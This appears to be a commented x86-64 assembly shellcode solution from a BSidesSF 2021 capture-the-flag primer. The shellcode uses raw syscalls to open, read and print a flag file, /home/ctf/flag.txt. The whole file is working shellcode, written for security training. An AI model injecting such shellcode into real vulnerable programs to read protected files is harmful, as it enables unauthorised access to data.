; https://www.skullsecurity.org/2021/bsidessf-ctf-2021-author-writeup-shellcode-primer-runme-runme2-and-runme3

bits 64

;;; OPEN

  mov rax, 2 ; Syscall 2 = sys_open
  call getfilename ; Pushes the next address onto the stack and jumps down
  db "/home/ctf/flag.txt",0 ; The literal flag, null terminated
getfilename:
  pop rdi ; Pop the top of the stack (which is the filename) into rdi
  mov rsi, 0 ; Flags = 0
  mov rdx, 0 ; Mode = 0
  syscall ; Perform sys_open() syscall, the file handle is returned in rax

;;; READ

  push rdi ; Temporarly store the filename pointer
  push rax ; Temporarily store the handle

  mov rax, 0 ; Syscall 0 = sys_read
  pop rdi ; Move the file handle into rdi
  pop rsi ; Use the same buffer where the filename pointer is stored (it's readable and writable)
  mov rdx, 36 ; rdx is the count
  syscall ; Perform sys_read() syscall, reading from the opened file

;;; WRITE

  mov rax, 1 ; Syscall 1 = sys_write
  mov rdi, 1 ; File handle to write to = stdout = 1
  ; (rsi is already the buffer)
  mov rdx, 36 ; rdx is the count again
  syscall ; Perform the sys_write syscall, writing the data to stdout

;;; EXIT
  mov rax, 60 ; Syscall 60 = exit
  mov rdi, 0 ; Exit with code 0
  syscall ; Perform an exit
